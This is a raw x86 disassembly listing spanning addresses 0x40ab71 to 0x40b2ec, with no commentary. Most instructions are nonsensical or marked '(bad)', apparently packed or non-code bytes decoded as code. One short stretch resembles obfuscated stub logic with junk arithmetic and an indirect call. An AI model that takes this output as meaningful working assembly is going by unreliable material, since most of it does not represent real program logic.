  40ab71:	jae    0x40abc2
  40ab73:	pusha  
  40ab74:	jp     0x40ab3b
  40ab76:	jmp    0x62c9:0xe09f221a
  40ab7d:	in     al,dx
  40ab7e:	stc    
  40ab7f:	mov    ah,0x31
  40ab81:	mov    bh,0x11
  40ab83:	mov    ebp,0xaf367942
  40ab88:	pusha  
  40ab89:	outs   dx,DWORD PTR ds:[esi]
  40ab8a:	ins    DWORD PTR es:[edi],dx
  40ab8b:	aaa    
  40ab8c:	out    0xef,eax
  40ab8e:	or     BYTE PTR [ebp+esi*1+0x68],0x90
  40ab93:	std    
  40ab94:	inc    esi
  40ab95:	les    edi,FWORD PTR [edi]
  40ab97:	mov    ebx,DWORD PTR [esi-0x5fb84f07]
  40ab9d:	push   esp
  40ab9e:	cmp    BYTE PTR [ebx],ah
  40aba0:	sub    BYTE PTR [edx+esi*8+0x22],0xb1
  40aba5:	xchg   edx,eax
  40aba6:	dec    ebp
  40aba7:	sub    DWORD PTR [edi-0x49],esi
  40abaa:	jmp    0x40abd1
  40abac:	dec    esi
  40abad:	mov    ah,0xc4
  40abaf:	cld    
  40abb0:	fmulp  st(1),st
  40abb2:	pushf  
  40abb3:	out    0x9d,eax
  40abb5:	mov    ds:0x504e8e8c,al
  40abba:	ds inc esi
  40abbc:	inc    ecx
  40abbd:	sbb    eax,0x42eccfcc
  40abc2:	pusha  
  40abc3:	jae    0x40ab7b
  40abc5:	imul   esi,DWORD PTR [edi-0x13],0x3
  40abc9:	out    dx,al
  40abca:	mov    BYTE PTR [edx+0x48],dl
  40abcd:	das    
  40abce:	mov    bl,0x8
  40abd0:	inc    ecx
  40abd1:	pusha  
  40abd2:	jae    0x40abb4
  40abd4:	imul   edx,DWORD PTR [esi-0x1589237a],0xffffffc8
  40abdb:	ins    BYTE PTR es:[edi],dx
  40abdc:	sbb    ebp,DWORD PTR ds:0x45c82b66
  40abe2:	aaa    
  40abe3:	call   FWORD PTR [eax-0x58]
  40abe6:	jbe    0x40abb2
  40abe8:	or     BYTE PTR [ebx+0x7c],ah
  40abeb:	xchg   esi,eax
  40abec:	call   0xb36cf67d
  40abf1:	(bad)  
  40abf2:	(bad)  
  40abf3:	shr    BYTE PTR [ebx+0x59],1
  40abf6:	xor    eax,0xbc4b5e6d
  40abfb:	mov    esp,0x5a1410f2
  40ac00:	inc    esp
  40ac01:	mov    esi,0x2c04c0ae
  40ac06:	hlt    
  40ac07:	fdivr  QWORD PTR [edx+ebp*2+0x15]
  40ac0b:	scas   eax,DWORD PTR es:[edi]
  40ac0c:	(bad)  
  40ac0d:	pushf  
  40ac0e:	mov    edi,0x1f3bc0e5
  40ac13:	push   ebx
  40ac14:	stos   DWORD PTR es:[edi],eax
  40ac15:	add    BYTE PTR [ecx-0x59afa175],al
  40ac1b:	jle    0x40abb3
  40ac1d:	lods   al,BYTE PTR ds:[esi]
  40ac1e:	push   edx
  40ac1f:	sti    
  40ac20:	cli    
  40ac21:	xor    ecx,DWORD PTR [esi]
  40ac23:	imul   eax,DWORD PTR [esi-0x774ac368],0xfffffffd
  40ac2a:	cmp    BYTE PTR [ecx],cl
  40ac2c:	iret   
  40ac2d:	in     eax,0xce
  40ac2f:	popa   
  40ac30:	daa    
  40ac31:	nop
  40ac32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac33:	in     al,dx
  40ac34:	mov    WORD PTR [edx],gs
  40ac36:	push   esi
  40ac37:	jno    0x40abc3
  40ac39:	mov    esp,0xad5c6733
  40ac3e:	lods   eax,DWORD PTR ds:[esi]
  40ac3f:	out    0x7c,al
  40ac41:	imul   ebp,DWORD PTR [ecx],0x534ea6a
  40ac47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac48:	cmp    DWORD PTR [eax-0x62360044],0x8129cb2f
  40ac52:	cli    
  40ac53:	add    BYTE PTR [edx-0x3d891f98],al
  40ac59:	ja     0x40abf6
  40ac5b:	(bad)  
  40ac5c:	outs   dx,DWORD PTR ds:[esi]
  40ac5d:	call   0x9cd37c1
  40ac62:	dec    edi
  40ac63:	out    dx,eax
  40ac64:	mov    es,WORD PTR [ebx+esi*8-0x655e43af]
  40ac6b:	or     dl,bl
  40ac6d:	scas   eax,DWORD PTR es:[edi]
  40ac6e:	and    bl,bh
  40ac70:	enter  0x22ae,0x5a
  40ac74:	loope  0x40ac00
  40ac76:	mul    DWORD PTR [ebx+0x6f]
  40ac79:	std    
  40ac7a:	inc    esi
  40ac7b:	xchg   ebp,eax
  40ac7c:	mov    dl,0xca
  40ac7e:	loope  0x40ac12
  40ac80:	not    ch
  40ac82:	sub    eax,DWORD PTR [eax-0x51]
  40ac85:	in     al,dx
  40ac86:	repz iret 
  40ac88:	in     al,0x93
  40ac8a:	add    eax,0xc5773965
  40ac8f:	and    al,ch
  40ac91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac92:	clc    
  40ac93:	call   0xc27bf3fd
  40ac98:	in     eax,dx
  40ac99:	sbb    DWORD PTR [eax+eiz*1],ecx
  40ac9c:	repnz (bad) 
  40ac9e:	enter  0x877b,0x80
  40aca2:	sub    ch,BYTE PTR [ecx+0x2e]
  40aca5:	pop    edi
  40aca6:	popa   
  40aca7:	clc    
  40aca8:	mov    DWORD PTR [ecx+0x72a3a713],ecx
  40acae:	xchg   edx,eax
  40acaf:	jmp    0x40acec
  40acb1:	dec    edi
  40acb2:	ret    0xffaf
  40acb5:	jle    0x40ac54
  40acb7:	dec    edx
  40acb8:	call   0xccdc5d82
  40acbd:	inc    eax
  40acbe:	adc    eax,0x26642d7b
  40acc3:	aaa    
  40acc4:	inc    ebx
  40acc5:	cmp    cl,ch
  40acc7:	or     BYTE PTR [ebx+0x7c],0x4
  40accb:	mov    edi,0x5945f5a
  40acd0:	aam    0x4
  40acd2:	fndisi(8087 only) 
  40acd4:	cmc    
  40acd5:	push   ss
  40acd6:	repnz adc ebp,DWORD PTR [esi-0x1f]
  40acda:	lahf   
  40acdb:	and    esi,DWORD PTR [esi-0x267e0b13]
  40ace1:	xchg   esp,eax
  40ace2:	or     BYTE PTR [eax+0x4],ch
  40ace5:	sub    DWORD PTR [ebx],0x8
  40ace8:	ds ins BYTE PTR es:[edi],dx
  40acea:	adc    BYTE PTR [edi],al
  40acec:	das    
  40aced:	inc    esi
  40acee:	mov    DWORD PTR [eax-0x4ff8efdb],edi
  40acf4:	pop    ecx
  40acf5:	dec    edx
  40acf6:	sbb    esi,ebx
  40acf8:	add    esi,DWORD PTR [edi+0x71fadc47]
  40acfe:	pop    eax
  40acff:	in     al,0x75
  40ad01:	adc    esi,DWORD PTR [ebx-0x51]
  40ad04:	mov    ecx,0xc900ee19
  40ad09:	xchg   BYTE PTR [edi+ebp*4-0x40],dh
  40ad0d:	xor    ebp,esp
  40ad0f:	shl    ebx,cl
  40ad11:	test   BYTE PTR [edx],dl
  40ad13:	ret    
  40ad14:	mov    cl,0xd2
  40ad16:	mov    bh,0x45
  40ad18:	in     eax,0x2f
  40ad1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad1b:	scas   eax,DWORD PTR es:[edi]
  40ad1c:	jmp    0x62f2f971
  40ad21:	or     al,0x3c
  40ad23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad24:	mov    ds:0xefb3d52c,al
  40ad29:	gs push cs
  40ad2b:	lock daa 
  40ad2d:	adc    cl,al
  40ad2f:	dec    ecx
  40ad30:	iret   
  40ad31:	pop    ebx
  40ad32:	lods   eax,DWORD PTR ds:[esi]
  40ad33:	or     al,0x9b
  40ad35:	or     ah,ah
  40ad37:	jecxz  0x40ad2d
  40ad39:	jge    0x40acd7
  40ad3b:	mov    cs,WORD PTR [esi-0x43690d98]
  40ad41:	test   DWORD PTR [eax+eax*2],0xb002357a
  40ad48:	jno    0x40adc0
  40ad4a:	das    
  40ad4b:	dec    ebx
  40ad4c:	inc    ebp
  40ad4d:	lea    edx,[ebp-0x6e]
  40ad50:	scas   eax,DWORD PTR es:[edi]
  40ad51:	and    esi,DWORD PTR [esi-0x60]
  40ad54:	dec    dh
  40ad56:	cmp    BYTE PTR [esi*8+0x10aa4404],0x5f
  40ad5e:	push   edi
  40ad5f:	pop    ebp
  40ad61:	pop    eax
  40ad62:	aaa    
  40ad63:	add    DWORD PTR [ecx],ebp
  40ad65:	leave  
  40ad66:	sub    ebx,DWORD PTR [edi+0x214f138a]
  40ad6c:	push   esp
  40ad6d:	jno    0x40ade3
  40ad6f:	adc    bl,bl
  40ad71:	mov    ch,0x72
  40ad73:	sgdtd  [ebx-0x1b85cb0b]
  40ad7a:	add    DWORD PTR [ebx-0x6d],edx
  40ad7d:	xchg   esi,eax
  40ad7e:	xchg   ebx,eax
  40ad7f:	outs   dx,BYTE PTR ds:[esi]
  40ad80:	mov    cl,0x1
  40ad82:	jle    0x40ad83
  40ad84:	scas   al,BYTE PTR es:[edi]
  40ad85:	ja     0x40adcb
  40ad87:	call   0x4167:0x7bbab562
  40ad8e:	and    al,0x45
  40ad90:	int3   
  40ad91:	(bad)
  40ad94:	xchg   esp,eax
  40ad95:	jecxz  0x40ad60
  40ad97:	push   eax
  40ad98:	push   cs
  40ad99:	fxtract 
  40ad9b:	or     eax,0xfe077bfb
  40ada0:	fwait
  40ada1:	pop    edx
  40ada2:	pop    ss
  40ada3:	jl     0x40adcb
  40ada5:	fs or  dh,al
  40ada8:	pop    edi
  40ada9:	stos   BYTE PTR es:[edi],al
  40adaa:	xor    BYTE PTR [edx-0x29030ee],ch
  40adb0:	arpl   WORD PTR [ecx],bx
  40adb2:	sbb    DWORD PTR [ebx-0x53],0xffffffd6
  40adb6:	or     dl,dh
  40adb8:	mov    dl,ch
  40adba:	push   cs
  40adbb:	outs   dx,BYTE PTR ds:[esi]
  40adbc:	idiv   BYTE PTR [ebx+eiz*1+0x30]
  40adc0:	lds    ebp,FWORD PTR [ecx]
  40adc2:	jmp    0x40ae28
  40adc4:	jmp    0x40adde
  40adc6:	and    DWORD PTR ds:0xcdd10ab1,eax
  40adcc:	jno    0x40ad5f
  40adce:	cwde   
  40adcf:	adc    eax,0xced1f9aa
  40add4:	push   es
  40add5:	mov    ah,0x8b
  40add7:	inc    edx
  40add8:	cld    
  40add9:	pop    ebx
  40adda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40addb:	mov    ds:0x969e120,eax
  40ade0:	inc    edx
  40ade1:	sbb    DWORD PTR [edi],esp
  40ade3:	mov    al,0x2d
  40ade5:	arpl   WORD PTR [esi+0x11],bx
  40ade8:	push   0x7ed109a9
  40aded:	pop    edi
  40adee:	mov    al,0xb8
  40adf0:	push   ebx
  40adf1:	mov    cl,0x7a
  40adf3:	imul   ebp,DWORD PTR [ebp-0x11],0x3f6960b
  40adfa:	(bad)  
  40adfb:	retf   0x5e54
  40adfe:	test   bl,ch
  40ae00:	and    eax,0xf22358bc
  40ae05:	xor    eax,edi
  40ae07:	dec    ebp
  40ae08:	(bad)  
  40ae09:	mov    ebp,0xe731693c
  40ae0e:	(bad)  
  40ae0f:	fimul  WORD PTR [ebp-0x55]
  40ae12:	addr16 cmc 
  40ae14:	dec    edi
  40ae15:	and    DWORD PTR [ebx],edx
  40ae17:	test   al,0xc8
  40ae19:	mov    ecx,0x9136383f
  40ae1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae1f:	test   eax,0xde6a5bc4
  40ae24:	das    
  40ae25:	imul   BYTE PTR [esi]
  40ae27:	pop    esi
  40ae28:	inc    edi
  40ae29:	jbe    0x40adab
  40ae2b:	neg    BYTE PTR [edi+0x47e6cec1]
  40ae31:	clc    
  40ae32:	xor    BYTE PTR [edi],dl
  40ae34:	or     al,BYTE PTR [edi-0x73bed83b]
  40ae3a:	sti    
  40ae3b:	add    BYTE PTR [ecx],dl
  40ae3d:	add    al,0x4b
  40ae3f:	in     al,dx
  40ae40:	jmp    0xd643:0xebeb55ff
  40ae47:	xchg   esp,eax
  40ae48:	inc    ecx
  40ae49:	mov    DWORD PTR [ebp-0x20],0x6ec3
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x42824b,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x428213
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x428347,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x42822b
  40aea0:	cmp    DWORD PTR ds:0x42824b,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x42807b
  40aebd:	call   DWORD PTR ds:0x428e38
  40aec3:	mov    ecx,DWORD PTR ds:0x4282cb
  40aec9:	xor    DWORD PTR ds:0x4281ef,ecx
  40aecf:	or     DWORD PTR ds:0x42833b,ecx
  40aed5:	or     DWORD PTR ds:0x428253,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x42825f
  40aee1:	adc    DWORD PTR ds:0x428227,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x428123
  40aeef:	adc    ecx,DWORD PTR ds:0x428347
  40aef5:	mov    DWORD PTR ds:0x428123,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x428343,0x4282b7
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x428123,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	push   ebp
  40af30:	mov    eax,0x1bb57c73
  40af35:	sbb    BYTE PTR [eax],bl
  40af37:	outs   dx,BYTE PTR ds:[esi]
  40af38:	adc    bl,BYTE PTR [eax]
  40af3a:	sbb    bh,cl
  40af3c:	pop    ebx
  40af3d:	mov    esi,ebx
  40af3f:	pop    esp
  40af40:	or     BYTE PTR [edx-0xa],bh
  40af43:	(bad)  
  40af44:	fimul  WORD PTR [esi+0x12c35802]
  40af4a:	adc    eax,0xc5e6e512
  40af4f:	call   0x744e:0xdf6bbc64
  40af56:	mov    edi,0xc9757f13
  40af5b:	jne    0x40af6b
  40af5d:	pop    edx
  40af5e:	stos   BYTE PTR es:[edi],al
  40af5f:	rcl    DWORD PTR [edi+0x6],0x8e
  40af63:	fnstcw WORD PTR [ebp-0x5f]
  40af66:	and    BYTE PTR ds:[edi+0x2a9156d7],bl
  40af6d:	out    dx,al
  40af6e:	test   DWORD PTR [edx+0x20],edi
  40af71:	adc    ebx,edi
  40af73:	and    eax,DWORD PTR [edi+edi*4-0x10a8d838]
  40af7a:	push   ecx
  40af7b:	stos   DWORD PTR es:[edi],eax
  40af7c:	ds pop edi
  40af7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af7f:	mov    cl,0x62
  40af81:	mov    BYTE PTR [ebx-0x4523d637],ch
  40af87:	jne    0x40afa3
  40af89:	and    al,bh
  40af8b:	aaa    
  40af8c:	sub    BYTE PTR [ecx+0x41],bh
  40af8f:	push   ecx
  40af90:	nop
  40af91:	cdq    
  40af92:	(bad)  [eax]
  40af94:	inc    eax
  40af95:	fisttp DWORD PTR [edi]
  40af97:	scas   eax,DWORD PTR es:[edi]
  40af98:	mov    edx,0x43bf974f
  40af9d:	sbb    eax,0x1562890c
  40afa2:	cmp    bl,BYTE PTR [ebx+edi*1+0x5cac4831]
  40afa9:	sub    cl,al
  40afab:	jmp    0x40af3f
  40afad:	adc    BYTE PTR [edi],bl
  40afaf:	repnz push 0xcbfb60
  40afb5:	pop    ebp
  40afb6:	jns    0x40afaf
  40afb8:	sub    al,0x75
  40afba:	push   ebp
  40afbb:	std    
  40afbc:	xor    eax,0xc9559de5
  40afc1:	fidiv  DWORD PTR [eax-0x7]
  40afc4:	je     0x40b007
  40afc6:	cwde   
  40afc7:	pop    edx
  40afc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afc9:	ja     0x40b038
  40afcb:	sar    dh,cl
  40afcd:	bound  edx,QWORD PTR [esi]
  40afcf:	mov    ds,ebx
  40afd1:	adc    eax,0x21
  40afd4:	in     al,0xb7
  40afd6:	loope  0x40afbe
  40afd8:	pop    es
  40afd9:	shl    DWORD PTR [ebx+esi*4],0x11
  40afdd:	ror    esp,0x22
  40afe0:	loop   0x40b02e
  40afe2:	sar    DWORD PTR [esi-0x61],0x2b
  40afe6:	adc    ecx,esi
  40afe8:	pop    esp
  40afe9:	cmp    bh,0x82
  40afec:	sbb    BYTE PTR [ecx],ch
  40afee:	inc    esp
  40afef:	pushf  
  40aff0:	push   ss
  40aff1:	pop    esi
  40aff2:	or     ah,ch
  40aff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aff5:	repnz cmp eax,0xdcf2059b
  40affb:	dec    ebp
  40affc:	scas   al,BYTE PTR es:[edi]
  40affd:	adc    bl,BYTE PTR [eax]
  40afff:	xchg   ebp,eax
  40b000:	cmp    bl,bl
  40b002:	rcl    BYTE PTR [ebp-0x7ccdc98e],1
  40b008:	jecxz  0x40b02d
  40b00a:	jns    0x40b03a
  40b00c:	push   ebp
  40b00d:	hlt    
  40b00e:	adc    DWORD PTR ds:0x33aab15c,esp
  40b014:	nop
  40b015:	jae    0x40aff6
  40b017:	xchg   esi,eax
  40b018:	scas   eax,DWORD PTR es:[edi]
  40b019:	sbb    ebx,DWORD PTR [edi+0x32]
  40b01c:	inc    eax
  40b01d:	mov    ebx,eax
  40b01f:	dec    edx
  40b020:	and    eax,0x37a2fa92
  40b025:	int    0xf9
  40b027:	mov    ebp,0x84ef8f4
  40b02c:	aas    
  40b02d:	int3   
  40b02e:	mov    DWORD PTR [ebx],edi
  40b030:	xchg   edx,eax
  40b031:	retf   0xfa8a
  40b034:	add    bh,BYTE PTR [ecx+0x60]
  40b037:	add    DWORD PTR [ebx],ecx
  40b039:	cmp    al,0xef
  40b03b:	cmp    DWORD PTR [ebx+0x6d265ef7],esp
  40b041:	sub    eax,0x3975b583
  40b046:	add    eax,0x5b6d0a6f
  40b04b:	xor    BYTE PTR ds:0x818003c3,bl
  40b051:	cld    
  40b052:	xor    esi,0x3c68e059
  40b058:	les    edx,FWORD PTR [ecx+0x4632698d]
  40b05e:	cmp    bl,ah
  40b060:	call   DWORD PTR [edi+ecx*4]
  40b063:	psubsw mm0,QWORD PTR [ecx]
  40b066:	ret    
  40b067:	push   ebp
  40b068:	sub    al,ch
  40b06a:	fldcw  WORD PTR ds:0xaf5d195a
  40b070:	lods   al,BYTE PTR ds:[esi]
  40b071:	mov    bh,bl
  40b073:	imul   BYTE PTR [ebx-0x73]
  40b076:	std    
  40b077:	fadd   st(1),st
  40b079:	js     0x40b0cd
  40b07b:	xchg   edx,ebx
  40b07d:	adc    esp,edi
  40b07f:	cli    
  40b080:	shr    BYTE PTR [esi+ebp*8-0x4b],cl
  40b084:	sbb    dh,BYTE PTR [ebp+ebx*2-0x19cebac5]
  40b08b:	and    bh,ch
  40b08d:	aam    0x21
  40b08f:	jbe    0x40b02a
  40b091:	jns    0x40b094
  40b093:	xchg   edi,eax
  40b094:	jne    0x40b106
  40b096:	and    al,0x57
  40b098:	stos   BYTE PTR es:[edi],al
  40b099:	mov    eax,0xdefea96c
  40b09e:	pop    esp
  40b09f:	sbb    DWORD PTR [ecx],0x395ac746
  40b0a5:	shl    DWORD PTR [eax],0xd2
  40b0a8:	wbinvd 
  40b0aa:	leave  
  40b0ab:	mov    fs,WORD PTR [esi+0x7b]
  40b0ae:	pop    esi
  40b0af:	xchg   edx,eax
  40b0b0:	cmp    ch,dl
  40b0b2:	call   0x51065e2c
  40b0b7:	lods   eax,DWORD PTR ds:[esi]
  40b0b8:	fucomi st,st(4)
  40b0ba:	cmp    eax,ebp
  40b0bc:	inc    ebx
  40b0bd:	int    0xc9
  40b0bf:	out    dx,eax
  40b0c0:	call   0x99c931e1
  40b0c5:	mov    dh,0xf3
  40b0c7:	xchg   edx,eax
  40b0c8:	adc    al,0xcd
  40b0ca:	mov    dh,BYTE PTR [edx]
  40b0cc:	pop    esi
  40b0cd:	add    eax,0x783c2743
  40b0d2:	jg     0x40b059
  40b0d4:	jmp    0x1770b40a
  40b0d9:	jge    0x40b0b6
  40b0db:	aas    
  40b0dc:	into   
  40b0dd:	sbb    BYTE PTR [esi],0xc3
  40b0e0:	stos   DWORD PTR es:[edi],eax
  40b0e1:	(bad)  
  40b0e2:	and    eax,DWORD PTR [eax+ebx*8]
  40b0e5:	adc    dh,BYTE PTR [edi-0x66]
  40b0e8:	in     eax,dx
  40b0e9:	es xchg edi,eax
  40b0eb:	xchg   edx,eax
  40b0ec:	sub    ah,BYTE PTR [ebp-0x77e93aae]
  40b0f2:	adc    al,0x23
  40b0f4:	mov    dh,0xd7
  40b0f6:	xlat   BYTE PTR ds:[ebx]
  40b0f7:	push   eax
  40b0f8:	sub    eax,0x7d584da8
  40b0fd:	add    bl,BYTE PTR ds:0xce8d6370
  40b103:	or     esi,ebx
  40b105:	daa    
  40b106:	retf   
  40b107:	ds jo  0x40b0e0
  40b10a:	sub    esp,edx
  40b10c:	stos   DWORD PTR es:[edi],eax
  40b10d:	jae    0x40b15c
  40b10f:	push   esp
  40b110:	dec    esp
  40b111:	add    eax,edi
  40b113:	test   DWORD PTR [edi+0x6c],esi
  40b116:	and    al,BYTE PTR [esi+eiz*1]
  40b119:	add    eax,0x410d2b14
  40b11e:	loopne 0x40b190
  40b120:	sub    ch,BYTE PTR [edx-0x285ca8f2]
  40b126:	sbb    eax,ebx
  40b128:	or     al,0x60
  40b12a:	std    
  40b12b:	lods   al,BYTE PTR ds:[esi]
  40b12c:	mov    ds:0x451760c7,al
  40b131:	adc    cl,BYTE PTR [edi+ecx*1+0x2d]
  40b135:	je     0x40b159
  40b137:	test   ebp,0x8507019e
  40b13d:	jns    0x40b0eb
  40b13f:	cs jno 0x40b144
  40b142:	adc    dl,BYTE PTR [eax-0x50]
  40b145:	stc    
  40b146:	xor    eax,DWORD PTR [edi]
  40b148:	arpl   WORD PTR [ecx+0x2b8e93f],bp
  40b14e:	sbb    al,dl
  40b150:	inc    ebx
  40b151:	cli    
  40b152:	stos   DWORD PTR es:[edi],eax
  40b153:	test   WORD PTR [eax+ecx*8],bx
  40b157:	pop    ss
  40b158:	outs   dx,BYTE PTR ds:[esi]
  40b159:	ror    DWORD PTR [ebp+ebx*4-0x2c],0x87
  40b15e:	pop    ebp
  40b15f:	fsubr  st(2),st
  40b161:	icebp  
  40b162:	mov    eax,0x3102a14f
  40b167:	dec    eax
  40b168:	fnstsw WORD PTR [ecx+edi*2]
  40b16b:	and    esp,DWORD PTR [esi]
  40b16d:	repnz push ebp
  40b16f:	jp     0x40b155
  40b171:	push   eax
  40b172:	lods   al,BYTE PTR ds:[esi]
  40b173:	mov    bh,bl
  40b175:	xchg   edi,eax
  40b176:	jno    0x40b1c0
  40b178:	fcom   DWORD PTR [edi]
  40b17a:	push   cs
  40b17b:	mov    al,0x62
  40b17d:	(bad)  [ecx]
  40b17f:	call   0xbe37bff0
  40b184:	mov    al,0x5f
  40b186:	add    al,0xeb
  40b188:	mov    bh,BYTE PTR [edx+0x2d693d29]
  40b18e:	daa    
  40b18f:	or     eax,0xdfb745b8
  40b194:	push   esp
  40b195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b196:	arpl   ax,bp
  40b198:	std    
  40b199:	add    ecx,DWORD PTR ss:[esi]
  40b19c:	pop    ss
  40b19d:	and    ebp,DWORD PTR [eax]
  40b19f:	icebp  
  40b1a0:	adc    edi,0xf9e6a2d1
  40b1a6:	jbe    0x40b217
  40b1a8:	pop    ebx
  40b1a9:	jno    0x40b15e
  40b1ab:	mov    ebx,0x2ba50323
  40b1b0:	ss mov esp,0x2890069
  40b1b6:	and    DWORD PTR [edi],esi
  40b1b8:	push   cs
  40b1b9:	les    esi,FWORD PTR [esi+0x70]
  40b1bc:	and    esp,DWORD PTR [ebp+edi*8-0x16]
  40b1c0:	add    edi,DWORD PTR [eax+0x34]
  40b1c3:	jge    0x40b244
  40b1c5:	xchg   edi,eax
  40b1c6:	dec    edi
  40b1c7:	fmul   DWORD PTR [ebx-0x60]
  40b1ca:	sbb    al,0x43
  40b1cc:	mov    ds:0xba2490e5,eax
  40b1d1:	push   cs
  40b1d2:	arpl   WORD PTR [edi],bp
  40b1d4:	cmp    ah,al
  40b1d6:	cmp    al,0x89
  40b1d8:	retf   
  40b1d9:	aaa    
  40b1da:	in     eax,0x23
  40b1dc:	stc    
  40b1dd:	jns    0x40b184
  40b1df:	aam    0x69
  40b1e1:	mov    dh,0x6f
  40b1e3:	jl     0x40b187
  40b1e5:	push   eax
  40b1e6:	jno    0x40b238
  40b1e8:	jbe    0x40b201
  40b1ea:	popa   
  40b1eb:	js     0x40b191
  40b1ed:	dec    esp
  40b1ee:	leave  
  40b1ef:	leave  
  40b1f0:	in     eax,dx
  40b1f1:	mov    BYTE PTR [edx-0x48],cl
  40b1f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1f5:	and    eax,0x5388756e
  40b1fa:	pop    ecx
  40b1fb:	mov    ebx,0xb30d9040
  40b200:	(bad)  
  40b201:	fwait
  40b202:	(bad)  
  40b203:	push   edx
  40b204:	lods   eax,DWORD PTR ds:[esi]
  40b205:	in     al,dx
  40b206:	mov    esp,0x7371f52f
  40b20b:	add    BYTE PTR [ebx],bh
  40b20d:	and    BYTE PTR [edi-0x436814d2],cl
  40b213:	sub    DWORD PTR [ecx-0x9],ebp
  40b216:	in     al,0xa1
  40b218:	mov    dl,0x5f
  40b21a:	xchg   ebp,eax
  40b21b:	sub    eax,0x30cbb383
  40b220:	xor    ah,bl
  40b222:	xchg   edx,eax
  40b223:	jmp    0x40b29b
  40b225:	mov    eax,0x704e7ace
  40b22a:	mov    dl,0x63
  40b22c:	retf   
  40b22d:	scas   eax,DWORD PTR es:[edi]
  40b22e:	push   ecx
  40b22f:	sbb    BYTE PTR [ecx+0x1f3ab702],0x3d
  40b236:	rcr    esi,0xf1
  40b239:	add    ebx,eax
  40b23b:	and    ebx,DWORD PTR [esi]
  40b23d:	mov    cl,0x4b
  40b23f:	mov    eax,ds:0x230259e9
  40b244:	mul    BYTE PTR [edi]
  40b246:	sub    dl,al
  40b248:	mov    edi,esp
  40b24a:	pop    ecx
  40b24b:	stos   DWORD PTR es:[edi],eax
  40b24c:	jbe    0x40b1d3
  40b24e:	mov    edi,0x642a0876
  40b253:	cs in  eax,0xb7
  40b256:	in     al,dx
  40b257:	xchg   ecx,eax
  40b258:	fidiv  WORD PTR [ebx-0x1d]
  40b25b:	rol    BYTE PTR [ebx+ebp*1],cl
  40b25e:	pop    es
  40b25f:	fild   DWORD PTR [eax+0x6d47527f]
  40b265:	inc    ecx
  40b266:	ins    BYTE PTR es:[edi],dx
  40b267:	dec    esp
  40b268:	in     eax,0xa0
  40b26a:	enter  0x9756,0x9d
  40b26e:	sbb    BYTE PTR [esi+0x76e3bb9a],dh
  40b274:	or     al,0x8f
  40b276:	dec    ecx
  40b277:	cmc    
  40b278:	les    edi,FWORD PTR [edi]
  40b27a:	out    0x3c,eax
  40b27c:	ret    
  40b27d:	add    ebp,DWORD PTR [ebx]
  40b27f:	jae    0x40b251
  40b281:	mov    ebx,0x8c0b9c39
  40b286:	(bad)  
  40b287:	and    eax,0x9371d4aa
  40b28c:	outs   dx,BYTE PTR ds:[esi]
  40b28d:	sahf   
  40b28e:	(bad)  
  40b28f:	js     0x40b29b
  40b291:	jecxz  0x40b303
  40b293:	add    ebp,ecx
  40b295:	xor    eax,0x11b1ae4d
  40b29a:	rcr    DWORD PTR [ebp-0x7c130fb2],cl
  40b2a0:	and    BYTE PTR [ebx-0x2f],0xfe
  40b2a4:	or     edx,DWORD PTR [edi-0x29]
  40b2a7:	dec    esp
  40b2a8:	ficomp DWORD PTR ss:[esp+esi*4]
  40b2ac:	in     eax,dx
  40b2ad:	mov    al,ds:0xb9b59bdf
  40b2b2:	push   0xc73e3955
  40b2b7:	and    al,dh
  40b2b9:	mov    dh,0xf3
  40b2bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2bc:	mov    bl,0x41
  40b2be:	cmp    DWORD PTR ds:0x8fc110c6,ebp
  40b2c5:	stos   BYTE PTR es:[edi],al
  40b2c6:	retf   0x4238
  40b2c9:	mov    ch,BYTE PTR [eax]
  40b2cb:	xchg   esi,eax
  40b2cc:	add    ah,BYTE PTR [edx-0x56ba213a]
  40b2d2:	daa    
  40b2d3:	jbe    0x40b290
  40b2d5:	and    al,0xaf
  40b2d8:	inc    ebp
  40b2d9:	lods   al,BYTE PTR ds:[esi]
  40b2da:	mov    bh,0x78
  40b2dc:	fild   WORD PTR [esi+0x14dea7dc]
  40b2e2:	dec    edi
  40b2e3:	cmp    ebx,ecx
  40b2e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2e6:	arpl   WORD PTR [esi+0x58f57df],cx
  40b2ec:	adc    edi,eax
